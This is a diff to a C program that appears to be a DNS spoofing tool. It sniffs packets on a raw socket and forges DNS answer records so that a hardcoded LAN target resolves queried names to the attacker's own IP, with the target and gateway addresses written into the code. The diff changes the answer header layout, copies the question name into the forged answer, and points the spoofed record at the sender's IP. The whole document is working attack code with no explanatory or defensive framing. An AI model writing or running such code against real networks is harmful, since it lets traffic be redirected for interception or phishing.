@@ -45,13 +45,13 @@ struct dnshdr{
 struct dnshdr *dns;
 
 struct anhdr{
-	uint16_t name;
 	uint16_t type;
 	uint16_t class;
 	uint16_t ttl1;
 	uint16_t ttl2;
 	uint16_t rdlength;
-	uint32_t rdata;
+	uint16_t rdata1;
+	uint16_t rdata2;
 };
 
 struct qdhdr{
@@ -95,14 +95,16 @@ uint16_t create_spoof(){
 	ssize_t qlen = strlen(question);
 	char *awnser = question + qlen + 1;
 	awnser = awnser + 4;
+	strcpy(awnser,question);
+	awnser = awnser + qlen + 1;
 	struct anhdr *ahdr = (struct anhdr *)awnser;
-	ahdr->name = 0x0cc0;
 	ahdr->type = htons(1);
 	ahdr->class = htons(1);
 	ahdr->ttl1 = htons(10);
 	ahdr->ttl2 = 0;
 	ahdr->rdlength = htons(4);
-	ahdr->rdata = inet_addr("172.217.19.68");
+	ahdr->rdata1 = ((uint16_t *)&myip)[0];
+	ahdr->rdata2 = ((uint16_t *)&myip)[1];
 	uint32_t container = ip_header->saddr;
 	ip_header->saddr = ip_header->daddr;
 	ip_header->daddr = /*target; */  inet_addr("192.168.178.87");
@@ -113,7 +115,7 @@ uint16_t create_spoof(){
 	udp->dest = c;
 	udp->check = 0;
 	calc_ip_checksum();
-	return length + qlen - 1 ;
+	return length + qlen * 2  ;
 }
 
 void print_dns(){
@@ -147,7 +149,7 @@ void print_dns(){
 		printf("class = %d\n",ntohs(ahdr->class));
 		printf("ttl = %d\n",ntohl(ahdr->ttl1));
 		printf("rdlength = %d\n",ntohs(ahdr->rdlength));
-		printf("rdata = 0x%.8x\n",ahdr->rdata);
+		printf("rdata = 0x%.4x%.4x\n",ahdr->rdata1,ahdr->rdata2);
 		name = ((char *)ahdr) + sizeof(struct anhdr);
 	}
 }
@@ -237,13 +239,11 @@ void handle_packet(ssize_t len){
 
 int main(){
 	struct anhdr ahdr;
-	printf("%p\n",&ahdr.name);
 	printf("%p\n",&ahdr.type);
 	printf("%p\n",&ahdr.class);
 	printf("%p\n",&ahdr.ttl1);
 	printf("%p\n",&ahdr.ttl2);
 	printf("%p\n",&ahdr.rdlength);
-	printf("%p\n",&ahdr.rdata);
 	int sock = socket(AF_PACKET,
 		SOCK_RAW,
 		htons(ETH_P_ALL));
@@ -266,9 +266,9 @@ int main(){
 	ip_header = ((char *)&packet) + sizeof(struct ethhdr);
 	udp = ((char *) ip_header) + sizeof(struct iphdr);
 	tcp = udp;
-	target = inet_addr("192.168.178.28");
+	target = inet_addr("192.168.178.32");
 	gateway = inet_addr("192.168.178.1");
-	myip = inet_addr("192.168.178.28");
+	myip = inet_addr("192.168.178.32");
 	dns = ((char *) udp) + sizeof(struct udphdr);
 	ssize_t plen = recvfrom(sock,packet,65536,0,NULL,NULL);
 	while(plen > 0){
